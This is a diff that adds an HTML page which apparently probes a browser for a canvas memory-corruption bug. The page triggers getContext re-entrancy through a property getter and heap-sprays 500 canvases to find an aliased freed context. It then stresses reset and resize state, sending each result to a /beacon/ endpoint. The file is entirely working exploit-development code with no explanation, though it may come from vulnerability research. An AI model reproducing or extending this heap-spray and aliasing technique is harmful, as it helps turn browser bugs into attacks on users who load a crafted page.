@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V965B</title></head>
+<body><pre id="out">V965B — alias ctx.reset()/canvas-resize × state oracle (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+var al=null;
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V965B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
+window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); };
+function st(){
+  try{
+    var gt='na';
+    if(typeof al.getTransform==='function'){ var m=al.getTransform(); function f(x){return (Math.abs(x)<1e-9)?0:+(+x).toFixed(4)} gt='t='+f(m.a)+','+f(m.d)+','+f(m.e)+','+f(m.f); }
+    return 'lw='+al.lineWidth+'|ga='+al.globalAlpha+'|gco='+al.globalCompositeOperation+'|'+gt;
+  }catch(e){ return 'stEx:'+String(e&&e.name); }
+}
+function snap(stage,exp){ var got=st(); var m=(exp==null)?'-':(got===exp?1:0); bk(stage,'got='+got+(exp!=null?'|m='+m:'')); return m; }
+async function establishAlias(){
+  bk('BOOT','alias ctx.reset()/canvas-resize oracle; run='+RUN);
+  var inner=null;
+  var c=document.createElement('canvas'); c.width=64; c.height=64;
+  var settings={};
+  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
+  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
+  if(!inner){ bk('NO-INNER',''); return false; }
+  bk('INNER','ok');
+  var spray=[];
+  for(var i=0;i<500;i++){ var c2=document.createElement('canvas'); c2.width=64; c2.height=64; var g=c2.getContext('2d'); g.lineWidth=1000+i; spray.push({c:c2,g:g}); }
+  bk('SPRAY','500');
+  var found=-1;
+  try{ inner.lineWidth=14141.14; }catch(e){ bk('W1-ERR',String(e)); return false; }
+  for(var i=0;i<spray.length;i++){ try{ if(Math.abs(spray[i].g.lineWidth-14141.14)<0.01){ found=i; al=spray[i].g; break; } }catch(e){} }
+  bk('ALIAS', found>=0?('idx='+found):'MISS');
+  bk('HAS-RESET', (typeof al.reset==='function')?'1':'0');
+  return found>=0;
+}
+(async function(){
+  if(!(await establishAlias())){ bk('DONE','no-alias/stop'); say('no alias'); return; }
+  bk('S0-PRE','baseline');
+  try{ al.lineWidth=5; al.globalAlpha=0.8; al.globalCompositeOperation='multiply'; if(typeof al.setTransform==='function') al.setTransform(2,0,0,2,3,4); }catch(e){ bk('S0-EX',String(e)); }
+  snap('S0-OK',null);
+  // A: ctx.reset() if available
+  bk('A-PRE','ctx.reset()');
+  try{
+    if(typeof al.reset==='function'){
+      al.reset();
+      bk('A-OK','after-reset '+st());
+      // set state again, save, reset, restore behavior? spec: reset clears state stack
+      al.lineWidth=7; al.save(); al.lineWidth=9;
+      al.reset();
+      bk('A2-OK','after-reset2 '+st());
+      try{ al.restore(); bk('A2-rest','ok '+st()); }catch(e){ bk('A2-rest-EX',String(e&&e.name)); }
+    } else { bk('A-SKIP','no-reset'); }
+  }catch(e){ bk('A-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
+  // B: canvas width reset idiom (resets context state per spec in many impls)
+  bk('B-PRE','canvas.width reset idiom');
+  try{
+    al.lineWidth=11; al.globalAlpha=0.5;
+    var cv=al.canvas; var w=cv.width;
+    cv.width=w; // reset
+    bk('B-OK','after-wreset '+st());
+    // try ops after
+    al.lineWidth=3; al.save(); al.restore();
+    bk('B2-OK','ops-ok '+st());
+  }catch(e){ bk('B-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
+  // C: resize
+  bk('C-PRE','resize 64->32->64');
+  try{
+    var cv=al.canvas;
+    al.lineWidth=6; al.save(); al.lineWidth=8;
+    cv.width=32; cv.height=32;
+    bk('C1-OK','32x32 '+st());
+    al.lineWidth=4; al.save(); al.restore();
+    cv.width=64; cv.height=64;
+    bk('C2-OK','64x64 '+st());
+    al.restore(); bk('C2-rest','ok '+st());
+  }catch(e){ bk('C-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
+  bk('DONE','reset/resize oracle complete; EX/crash=signal');
+  say('done run='+RUN);
+})();
+</script>
+</body></html>
